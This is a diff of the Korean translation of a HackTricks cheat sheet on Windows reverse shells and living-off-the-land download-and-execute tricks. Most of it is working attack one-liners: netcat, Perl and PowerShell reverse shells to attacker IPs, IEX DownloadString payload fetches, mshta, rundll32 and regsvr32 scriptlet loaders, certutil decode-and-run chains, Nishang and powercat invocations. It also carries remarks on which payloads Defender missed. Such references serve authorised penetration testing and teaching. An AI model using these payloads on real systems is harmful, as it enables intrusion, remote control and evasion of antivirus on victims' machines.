@@ -2,22 +2,30 @@
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로에서 히어로까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 되는 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
+* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
 * **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Lolbas
 
-[https://lolbas-project.github.io/](https://lolbas-project.github.io/) 페이지는 윈도우용 [https://gtfobins.github.io/](https://gtfobins.github.io/)와 같습니다.\
-명백히, **윈도우에는 SUID 파일이나 sudo 권한이 없지만**, **일부 이진 파일**이 (악용하여) **임의의 코드를 실행하는 등 예상치 못한 작업을 수행하는 방법을 알아두는 것이 유용합니다.**
+[https://lolbas-project.github.io/](https://lolbas-project.github.io/) 페이지는 [https://gtfobins.github.io/](https://gtfobins.github.io/)가 리눅스를 위한 것처럼 윈도우를 위한 것입니다.\
+명백히, **윈도우에는 SUID 파일이나 sudo 권한이 없지만**, 어떤 **바이너리**가 일종의 예상치 못한 작업을 수행하기 위해 (남용되어) 사용될 수 있는 방법을 알아두는 것이 유용합니다. 
 
 ## NC
 ```bash
@@ -25,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/)는 휴대용 및 안전한 Netcat 대체품**입니다. Unix와 유사한 시스템 및 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 정의 소스 포트 및 지속적인 재연결과 같은 기능을 갖춘 sbd는 TCP/IP 통신에 대한 다재다능한 솔루션을 제공합니다. Windows 사용자에게는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 신뢰할 수 있는 대체품으로 사용할 수 있습니다.
+**[sbd](https://www.kali.org/tools/sbd/)는 휴대용 및 안전한 Netcat 대체품**입니다. Unix류 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 정의 소스 포트, 지속적인 재연결 등의 기능을 갖춘 sbd는 TCP/IP 통신에 대한 다재다능한 솔루션을 제공합니다. Windows 사용자에게는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 신뢰할 수 있는 대체품으로 사용할 수 있습니다.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -44,7 +52,7 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-펄(Pearl)은 유연하고 강력한 스크립팅 언어로, 윈도우 시스템에서도 많이 사용됩니다. 펄을 사용하면 윈도우 시스템에서도 다양한 작업을 자동화하고 스크립트를 실행할 수 있습니다.
+펄
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -82,7 +90,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 네트워크 호출을 수행하는 프로세스: **powershell.exe**\
-디스크에 기록된 페이로드: **아니요** (_적어도 procmon을 사용하여 찾을 수 있는 곳에는 없었습니다!_)
+디스크에 기록된 페이로드: **아니요** (_procmon을 사용하여 찾을 수 있는 곳에는 적어도 없습니다!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -91,7 +99,7 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**이 문서의 끝에서 다양한 Powershell 쉘에 대한 자세한 정보를 얻으세요**
+**이 문서의 끝에서 다양한 Powershell 쉘에 대한 자세한 정보를 확인하세요**
 
 ## Mshta
 
@@ -132,7 +140,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**여기서**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**여기에서**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -161,16 +169,16 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Defender에 의해 감지됨**
+**디펜더에 의해 감지됨**
 
 
 
 
 ## **Rundll32**
 
-[**Dll hello world 예제**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
 
-* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [여기서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -182,7 +190,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http
 
 **Rundll32 - sct**
 
-[**여기서**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**여기에서**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -244,8 +252,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Regsvr32 - Metasploit**
-
-#### **Regsvr32 - Metasploit**
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -258,13 +264,13 @@ run
 
 ## Certutil
 
-* [여기서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
-B64dll을 다운로드하고 디코딩한 후 실행합니다.
+B64dll을 다운로드하고 디코딩하여 실행합니다.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-B64exe를 다운로드하고 디코딩한 후 실행합니다.
+B64exe를 다운로드하고 디코딩한 후 실행하십시오.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -371,25 +377,25 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\fol
 ```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-**해보지 않았습니다**
+**시도해보지 않았습니다**
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## 파워쉘 쉘
+## 파워쉘 셸
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-**Shells** 폴더에는 다양한 쉘이 있습니다. Invoke-_PowerShellTcp.ps1_을 다운로드하고 실행하려면 스크립트를 복사하고 파일 끝에 추가하십시오:
+**Shells** 폴더에는 다양한 셸이 있습니다. Invoke-_PowerShellTcp.ps1_을 다운로드하고 실행하려면 스크립트의 사본을 만들고 파일 끝에 추가하십시오:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-웹 서버에서 스크립트를 제공하고 피해자의 단말에서 실행하십시오:
+웹 서버에서 스크립트를 제공하고 피해자의 단말기에서 실행합니다:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender는 아직 악성 코드로 감지하지 않습니다 (아직, 2019년 3월 4일).
+Defender는 아직 악성 코드로 감지하지 못했습니다 (아직, 2019년 3월 4일).
 
 **할 일: 다른 nishang 쉘을 확인하세요**
 
@@ -397,11 +403,11 @@ Defender는 아직 악성 코드로 감지하지 않습니다 (아직, 2019년 3
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-다운로드, 웹 서버 시작, 수신기 시작 및 피해자 단말에서 실행하세요:
+다운로드하고, 웹 서버를 시작하고, 수신기를 시작하고, 피해자의 단말기에서 실행하세요:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender는 아직 악성 코드로 감지하지 않습니다 (2019년 3월 4일 기준).
+Defender는 악성 코드로 감지하지 않습니다 (아직, 2019년 3월 4일).
 
 **powercat에서 제공하는 다른 옵션:**
 
@@ -444,7 +450,7 @@ python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
 msfconsole -r unicorn.rc
 ```
-웹 서버를 시작하여 _powershell\_attack.txt_ 파일을 제공하고 피해자에서 다음을 실행하십시오:
+피해자에서 다음을 실행하고 _powershell\_attack.txt_ 파일을 서비스하는 웹 서버를 시작하십시오:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -466,16 +472,22 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) 악의적인 PS 모듈과 프�
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
-<summary><strong>제로부터 AWS 해킹을 전문가로 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가로 배우세요!</summary>
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사를 HackTricks에서 광고하거나 PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
+* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)에 가입하거나 [텔레그램 그룹](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
-* **HackTricks 및 HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유하세요.**
+* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나**트위터** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 팔로우하세요**.
+* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
 
 </details>
